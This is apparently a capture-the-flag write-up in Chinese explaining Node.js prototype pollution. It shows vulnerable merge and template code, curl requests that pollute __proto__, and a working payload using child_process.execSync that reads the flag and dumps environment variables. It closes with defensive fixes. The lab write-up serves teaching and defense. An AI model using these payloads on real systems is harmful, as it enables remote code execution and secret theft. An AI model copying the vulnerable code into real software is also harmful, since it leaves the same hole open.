概述

原型链污染（Prototype Pollution）是Node.js特有的安全漏洞，攻击者可以通过修改对象的原型链来影响整个应用的行为。当原型链污染与其他漏洞（如模板注入）结合时，可以实现远程代码执行（RCE）。

原型链污染就像给所有猫咪都戴上了同一顶帽子——你改了一个，所有的都变了

什么是原型链污染

在JavaScript中，每个对象都有一个__proto__属性指向它的原型。当我们修改Object.prototype时，所有对象都会受到影响：

// 正常情况
const obj = {};
console.log(obj.name);  // undefined

// 污染原型后
Object.prototype.name = "hacked";
console.log(obj.name);  // "hacked" - 所有对象都有了name属性!

为什么危险？

  • 可以覆盖应用的配置参数
  • 可以注入恶意代码到模板引擎
  • 可以绕过安全检查
  • 可以修改数据库查询条件

漏洞代码分析

以下是靶场中的漏洞代码：

1. 深拷贝函数（存在漏洞）

function deepMerge(target, source) {
  for (const key in source) {
    const value = source[key];
    if (value && typeof value === "object" && !Array.isArray(value)) {
      if (!target[key]) {
        target[key] = {};
      }
      deepMerge(target[key], value);  // 递归合并
    } else {
      target[key] = value;  // 直接赋值
    }
  }
  return target;
}

问题在哪？

当source包含__proto__属性时，deepMerge会修改Object.prototype：

// 攻击payload
const malicious = JSON.parse('{"__proto__": {"isAdmin": true}}');
deepMerge({}, malicious);

// 现在所有对象都有isAdmin属性
const user = {};
console.log(user.isAdmin);  // true!

2. 模板引擎（存在漏洞）

function renderTemplate(template, locals, options = {}) {
  const escapeFunction = options.escapeFunction || "escapeHtml";
  
  // 危险！直接将escapeFunction拼入代码
  const body = 
    "const out = [];\n" +
    `const escape = ${escapeFunction};\n` +  // 这里！
    // ...
  
  // 使用new Function执行，相当于eval
  const compiled = new Function("locals", "escapeHtml", "resolvePath", "require", body);
  return compiled(locals, escapeHtml, resolvePath, require);
}

问题在哪？

options.escapeFunction被直接拼入new Function()的代码中，如果能控制这个值，就能执行任意代码。

利用过程

Step 1: 发现原型链污染入口

页面有一个表单，POST数据到/api/profile。测试发现：

# 发送包含__proto__的JSON
curl -X POST http://target/api/profile \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"test": "polluted"}}'

# 访问任意页面，发现test属性被污染
curl http://target/preview/xxx
# 页面显示 test: polluted

Step 2: 分析源码

访问/source获取源码，发现：

  • deepMerge函数存在原型链污染
  • renderTemplate使用options.escapeFunction拼接代码
  • 模板渲染时会调用new Function()

Step 3: 构造Payload

污染Object.prototype.escapeFunction，注入JavaScript代码：

Payload:
escapeHtml;out.push(require("child_process").execSync("cat /flag").toString());var _tmp=0

分解：
- escapeHtml;  → 保持原有功能，分号结束
- out.push(...)  → 将命令执行结果加入输出
- require("child_process").execSync("cat /flag")  → 执行系统命令
- .toString()  → 转为字符串
- var _tmp=0  → 闭合变量声明

从污染到RCE

发送完整payload：

curl -X POST http://target/api/profile \
  -H "Content-Type: application/json" \
  -d '{
    "__proto__": {
      "escapeFunction": "escapeHtml;out.push(require(\"child_process\").execSync(\"env\").toString());var _tmp=0"
    }
  }'

访问预览页面，查看执行结果：

curl http://target/preview/xxx

输出：
GZCTF_FLAG=flag{9e784bf015e14aa0a29ffee5befe53c6}
FLAG=flag{9e784bf015e14aa0a29ffee5befe53c6}
...

Flag: flag{9e784bf015e14aa0a29ffee5befe53c6}

完整攻击链

2 构造原型链污染payload 污染escapeFunction属性

防御方案

  • 过滤__proto__：在合并对象时过滤掉__proto__、constructor、prototype等危险属性
  • 使用Object.create(null)：创建没有原型的对象
  • 使用Map代替Object：Map不受原型链污染影响
  • 冻结原型：Object.freeze(Object.prototype)
  • 输入验证：严格验证JSON输入，拒绝包含危险键名的数据
  • 避免eval/new Function：不要将用户输入拼入动态代码
// 安全的深拷贝
function safeDeepMerge(target, source) {
  for (const key in source) {
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
      continue;  // 跳过危险属性
    }
    // ... 正常合并逻辑
  }
}
